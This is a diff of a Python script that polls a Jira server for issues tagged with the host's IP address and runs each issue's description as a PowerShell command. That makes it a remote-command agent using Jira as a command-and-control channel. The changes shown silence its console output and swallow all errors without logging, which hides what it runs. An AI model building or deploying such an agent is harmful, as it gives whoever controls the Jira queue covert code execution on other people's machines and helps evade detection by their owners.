@@ -4,16 +4,18 @@ import socket
 import time
 from time import timezone
 from datetime import datetime, timezone
-
-
 import requests
 import schedule
 from dotenv import load_dotenv
 import subprocess
 from requests.auth import HTTPBasicAuth
-from statsmodels.sandbox.distributions.examples.matchdist import categ
+from pathlib import Path
 
-load_dotenv()
+#helps with path finding for env
+env_path = Path(__file__).resolve().parent / ".env"
+
+load_dotenv(dotenv_path=env_path)
+
 email =  os.getenv('EMAIL')
 token = os.getenv('API_TOKEN')
 url = os.getenv('BASE_URL')
@@ -71,7 +73,7 @@ def ip_mapping():
 
     # -1 is a placeholder for all of these cases
     # IP mappings for each host group
-    pitwall_IP_octet =       pitwall_IP.split('.')
+    pitwall_IP_octet  =      pitwall_IP.split('.')
     teamradio_IP_octet =     teamradio_IP.split('.')
     transporters_IP_octet =  transporters_IP.split('.')
     stewards_IP_octet =      stewards_IP.split('.')
@@ -126,7 +128,7 @@ def command():
 
     response = requests.post(url=f"{url}/rest/api/3/search/jql", json=search, headers=headers, auth=auth, timeout=20)
 
-    print(response.json())
+    #print(response.json())
 
     #there are tasks in the demand queue
     if not len(response.json()["issues"]) == 0:
@@ -136,10 +138,10 @@ def command():
             #.get prevents key error
             if IP["fields"].get("customfield_10048") == str(ip_addr):
                 issue_key = IP["key"]
-                print("CHECK FOR COMMAND - THEN RUN COMMAND")
+                #print("CHECK FOR COMMAND - THEN RUN COMMAND")
 
                 #double wrapped content means have to access it twice
-                print(IP["fields"]["description"]["content"][0]["content"][0]["text"])
+                #print(IP["fields"]["description"]["content"][0]["content"][0]["text"])
 
                 args = ["powershell.exe", "-NoProfile", "-Command",
                         IP["fields"]["description"]["content"][0]["content"][0]["text"]]
@@ -285,9 +287,15 @@ def main():
         while True:
             schedule.run_pending()
             time.sleep(10)
-
     except:
         pass
+        """
+        log_path = Path.home() / "jira_client_error.log"
+
+        with open(log_path, "a", encoding="utf-8") as f:
+            f.write(f"\n--- {datetime.now()} ---\n")
+            f.write(traceback.format_exc())
+        """
 
 if __name__ == '__main__':
     main()
